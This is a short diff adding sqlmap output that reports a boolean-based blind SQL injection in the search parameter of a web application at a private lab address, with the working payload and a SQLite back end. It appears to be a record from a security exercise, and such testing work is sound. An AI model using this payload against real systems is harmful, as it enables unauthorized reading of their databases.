@@ -1,0 +1,8 @@
+sqlmap identified the following injection point(s) with a total of 41 HTTP(s) requests:
+---
+Parameter: #1* (URI)
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: http://192.168.102.14:3000/rest/products/search?q=') AND 1464=1464 AND ('AJow' LIKE 'AJow
+---
+back-end DBMS: SQLite
